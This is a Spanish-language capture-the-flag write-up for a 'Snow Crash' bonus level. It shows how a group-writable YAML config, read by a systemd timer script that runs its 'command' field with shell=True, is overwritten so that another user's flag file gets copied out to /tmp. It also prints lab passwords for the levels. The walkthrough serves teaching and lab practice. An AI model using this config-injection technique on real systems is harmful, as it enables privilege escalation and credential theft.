# Bonus04 - Snow Crash

## Tipo de ejercicio

Inyección de comando mediante un fichero de configuración **YAML escribible por
grupo**, consumido periódicamente por un servicio `systemd` (`oneshot` + timer)
que ejecuta el campo `command` con `subprocess.run(..., shell=True)` como
usuario privilegiado.

## Objetivo

Obtener la credencial asociada a `flagbonus04` / al siguiente nivel bonus.

El script `/opt/snowcrash/bonus04/juanita.py` es legible por todos. El timer
`juanita.timer` lo lanza cada ~60 segundos como `flagbonus04`. La configuración
`/etc/juanita/config.yaml` es modificable por el grupo `juanita_grp`, al que
pertenece `bonus04`.

La pista del home de `bonus04` es:

```text
Juanita understood things others didn't bother to read.
```

---

## 1. Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus04@localhost -p 2424
```

La contraseña de `bonus04` es la flag de `bonus03`:

```text
mof3b3iud5c3p35bsv9aua0bj
```

Comprobar identidad y entorno:

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus04
uid=3004(bonus04) gid=3004(bonus04) groups=3004(bonus04),1001(levelgroup),4011(juanita_grp)
/home/bonus04
```

```text
Juanita understood things others didn't bother to read.
```

Detalle importante del `id`: el usuario pertenece al grupo **`juanita_grp`**
(`4011`). Esto por sí solo no demuestra que pueda modificar la configuración;
primero hay que localizar el archivo de configuración. Se busca en `/etc`
porque es la ruta convencional en Linux para los ficheros de configuración
del sistema, y el nombre `juanita` ya apareció como pista (grupo
`juanita_grp`, frase del home):

```bash
ls -la /etc/juanita/
```

Al ver `config.yaml` en el listado, se pueden consultar sus permisos:

```bash
ls -l /etc/juanita/config.yaml
```

La salida documentada es:

```text
-rw-rw-r--  1 root juanita_grp 3722 ... config.yaml
```

El grupo propietario es `juanita_grp` y tiene permiso de escritura (`rw-`).
Como `id` confirma que `bonus04` pertenece a ese grupo, puede modificar el
YAML existente.

Para comprobar la shell configurada para `flagbonus04`, consulta la base de
cuentas del sistema:

```bash
getent passwd flagbonus04
```

La última columna de la salida es la shell; si muestra `/usr/sbin/nologin`,
esa cuenta no permite iniciar una sesión interactiva. Para localizar las
unidades de systemd relacionadas con Juanita, lista los archivos de unidad:

```bash
systemctl list-unit-files | grep -i juanita
```

```text
juanita.service                              static          -
juanita.timer                                enabled         enabled
```

Consultamos la definición del servicio:

```bash
systemctl cat juanita.service
```

La línea `User=flagbonus04` confirma que el servicio se ejecuta como esa
cuenta. La sección 3 muestra la salida de la unidad.

---

## 2. Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus04
```

Resultado:

```text
/opt/snowcrash/bonus04:
-rwxr-xr-x  1 root root 7606 ... juanita.py
```

El script es **legible y ejecutable** por cualquier usuario. Conviene leerlo
entero:

```bash
cat /opt/snowcrash/bonus04/juanita.py
```

---

## 3. Servicio y timer systemd

```bash
systemctl cat juanita.service
systemctl cat juanita.timer
systemctl list-timers --all | grep -i juanita
systemctl status juanita.timer --no-pager
```

### `juanita.service`

```ini
[Unit]
Description=Snow Crash bonus04 — Juanita YAML executor service
After=network.target

[Service]
Type=oneshot
User=flagbonus04
Group=flagbonus04
ExecStart=/usr/bin/python3 /opt/snowcrash/bonus04/juanita.py
StandardOutput=journal
StandardError=journal
```

### `juanita.timer`

```ini
[Unit]
Description=Snow Crash bonus04 — Juanita YAML executor timer (every 60 s)

[Timer]
OnBootSec=10s
OnUnitActiveSec=60s
Unit=juanita.service

[Install]
WantedBy=timers.target
```

Implicaciones:

- Cada ~**60 segundos** se ejecuta `juanita.py` como **`flagbonus04`**.
- Tipo `oneshot`: arranca, termina y vuelve a esperar al siguiente disparo del
  timer.
- No hace falta (ni suele ser posible) lanzar el servicio a mano sin privilegios
  de administración; basta con esperar al timer.

---

## 4. Lógica relevante de `juanita.py`

> **Nota:** los bloques de esta sección son fragmentos del **código fuente**
> de `juanita.py` (lenguaje Python), copiados aquí solo para explicar qué hace
> el script. **No son comandos**: no se pegan en la terminal `bash` de SSH. El
> propio script ya se ejecuta automáticamente cada ~60 segundos a través del
> timer `juanita.timer` visto en la sección 3; no hace falta lanzarlo a mano.

El script define estas rutas:

```python
CONFIG_PATH = "/etc/juanita/config.yaml"
LOG_PATH    = "/var/log/juanita/juanita.log"
PID_FILE    = "/var/run/juanita.pid"
```

Al arrancar, `juanita.py` abre y parsea el YAML de configuración:

```python
with open(config_path, "r", encoding="utf-8") as fh:
    cfg = yaml.safe_load(fh)
```

Usa `yaml.safe_load`, que **no** permite ejecutar código solo por el formato
del YAML (a diferencia de `yaml.load` sin `Loader` seguro). Es decir, el fallo
de seguridad de este nivel **no** está en cómo se parsea el YAML, sino en
**qué hace el script después con uno de los valores leídos** (el campo
`command`, visto más abajo).

Después, el script comprueba que la configuración tenga una forma mínima
(función `_validate_config`):

- Deben existir las claves de primer nivel: `metadata`, `services`, `defaults`.
- Debe existir `services.executor`.
- `services.executor` debe ser un diccionario con clave **`command`**.

Y finalmente ejecuta ese comando:

```python
command = executor_cfg["command"]
...
result = subprocess.run(
    command,
    shell=True,
    timeout=timeout,
    capture_output=True,
    text=True,
)
```

Aquí está el problema: `shell=True` hace que `subprocess.run` entregue el
texto de `command` a una shell (`/bin/sh`) para que lo interprete, tal cual
escribirías un comando en la terminal. Como el script corre con el usuario
`flagbonus04` (según vimos en `juanita.service`), **cualquier comando que se
escriba en ese campo `command` del YAML se ejecuta con los privilegios de
`flagbonus04`**. Si `bonus04` puede modificar ese YAML (sección 5), puede
controlar qué comando se ejecuta.

---

## 5. Permisos de la configuración

```bash
ls -la /etc/juanita/
ls -la /etc/juanita/config.yaml
```

```text
drwxr-xr-x  2 root juanita_grp 4096 ... .
-rw-rw-r--  1 root juanita_grp 3722 ... config.yaml
```

| Ruta | Permisos | Efecto para `bonus04` |
|------|----------|------------------------|
| `/etc/juanita/` | `drwxr-xr-x` root:`juanita_grp` | Listar/entrar; **no** crear ficheros nuevos |
| `/etc/juanita/config.yaml` | `-rw-rw-r--` root:`juanita_grp` | **Leer y modificar** el YAML |

Comprobación:

```bash
touch /etc/juanita/test_write
# touch: cannot touch '...': Permission denied
```

Crear un fichero nuevo falla (el directorio no es escribible por el grupo),
pero sí se puede **sobrescribir el fichero existente** `config.yaml`, porque
ese archivo sí tiene permiso de escritura de grupo. El procedimiento completo
para sobrescribirlo se muestra en la sección 6 (Explotación).

El YAML original incluye mucho ruido operativo (`network`, `storage`,
`alerting`, etc.). Solo importan las secciones que exige el validador y el
campo `services.executor.command` (por defecto `"/bin/true"`).

---

## 6. Explotación

Sustituir la configuración por una mínima válida cuyo `command` copie el
`.flag` a un sitio legible:

```bash
# Copia de seguridad opcional
cp /etc/juanita/config.yaml /tmp/config.yaml.bak

cat > /etc/juanita/config.yaml << 'EOF'
metadata:
  service_name: juanita
  version: "3.1.0"
defaults:
  retry_policy:
    retry_count: 1
    backoff_secs: 0
services:
  executor:
    command: "cp /home/flagbonus04/.flag /tmp/juanita_flag && chmod 644 /tmp/juanita_flag"
    timeout_secs: 30
    label: getflag
EOF

cat /etc/juanita/config.yaml
```

Esperar al timer (hasta ~60–70 s):

Este bucle sondea cada 5 segundos, hasta 15 veces, si ya existe
`/tmp/juanita_flag`. Cuando el `.timer` dispare `juanita.service` (sección 3),
`juanita.py` leerá el YAML modificado y ejecutará el `command` indicado que
copia la `.flag` de `flagbonus04` a `/tmp/juanita_flag` y le da permiso de
lectura (`chmod 644`). En cuanto el archivo aparece, el bucle lo detecta,
muestra su contenido y termina (`break`); las líneas finales (`ls -la` y
`cat`) son una comprobación adicional por si el bucle ya terminó.

```bash
for i in $(seq 1 15); do
  if [ -f /tmp/juanita_flag ]; then
    echo "FOUND"
    cat /tmp/juanita_flag
    break
  fi
  sleep 5
  echo "  tick $i"
done
ls -la /tmp/juanita_flag
cat /tmp/juanita_flag
```

Salida obtenida:

```text
FOUND
oo0eoaiia5ei8oo9xasah2ihu
-rw-r--r-- 1 flagbonus04 flagbonus04 26 ... /tmp/juanita_flag
oo0eoaiia5ei8oo9xasah2ihu
```

### Secuencia

1. `bonus04` sobrescribe `/etc/juanita/config.yaml` (permiso de grupo).
2. `juanita.timer` dispara `juanita.service`.
3. `juanita.py` corre como `flagbonus04`, hace `safe_load` del YAML y valida el
   esquema.
4. Ejecuta `command` con `shell=True`.
5. Aparece `/tmp/juanita_flag` con la credencial.

---

## 7. Credencial final

```text
oo0eoaiia5ei8oo9xasah2ihu
```

Guardar en el repositorio:

```text
bonus04/flag
```

con una sola línea con esa cadena.

Ese valor se usa como contraseña SSH del siguiente nivel bonus (`bonus05`):

```bash
ssh bonus05@localhost -p 2424
# password: oo0eoaiia5ei8oo9xasah2ihu
```

---

## 8. Resumen de comandos válidos

```bash
ssh bonus04@localhost -p 2424
ls -la
cat README
cat /opt/snowcrash/bonus04/juanita.py
systemctl cat juanita.service
systemctl cat juanita.timer
ls -la /etc/juanita/config.yaml

cp /etc/juanita/config.yaml /tmp/config.yaml.bak
cat > /etc/juanita/config.yaml << 'EOF'
metadata:
  service_name: juanita
  version: "3.1.0"
defaults:
  retry_policy:
    retry_count: 1
    backoff_secs: 0
services:
  executor:
    command: "cp /home/flagbonus04/.flag /tmp/juanita_flag && chmod 644 /tmp/juanita_flag"
    timeout_secs: 30
    label: getflag
EOF

# Esperar ~60 s al timer
cat /tmp/juanita_flag
```

---

## 9. Conceptos importantes

- **`systemd` timer + oneshot**: ejecución periódica sin daemon permanente; el
  usuario no necesita `systemctl start` si el timer está activo.
- **`yaml.safe_load`**: evita objetos arbitrarios de PyYAML, pero **no** mitiga
  un campo de configuración que luego se pasa a `shell=True`.
- **`subprocess.run(..., shell=True)`**: el string completo se interpreta por
  `/bin/sh` (o equivalente); es equivalente a dejar un “script” configurable
  por quien pueda editar el YAML.
- **Permisos de grupo en un fichero de config**: un directorio no escribible
  puede seguir siendo explotable si un fichero concreto dentro sí lo es
  (`-rw-rw-r--` con grupo del atacante).
- **Validación de esquema incompleta**: exigir claves y un `command` no vacío
  no implica una lista blanca de comandos seguros.

---

## 10. Conclusión

No se necesita deserialización insegura ni modificar el binario del servicio.
La solución consiste en:

1. Leer `juanita.py` y localizar `CONFIG_PATH` y `shell=True`.
2. Comprobar que `/etc/juanita/config.yaml` es escribible por `juanita_grp`.
3. Escribir un YAML mínimo válido cuyo `services.executor.command` copie
   `/home/flagbonus04/.flag` a `/tmp/juanita_flag`.
4. Esperar al timer y leer el fichero de salida.

Credencial obtenida:

```text
oo0eoaiia5ei8oo9xasah2ihu
```

---

## 11. Estructura recomendada en el repositorio

```text
bonus04/
├── flag                          # oo0eoaiia5ei8oo9xasah2ihu
└── resources/
    └── bonus04.md                # este documento
```

Según la convención del repo `42_snow-crash`, la guía detallada vive en
`bonus04/resources/bonus04.md` y el token en `bonus04/flag`.
```
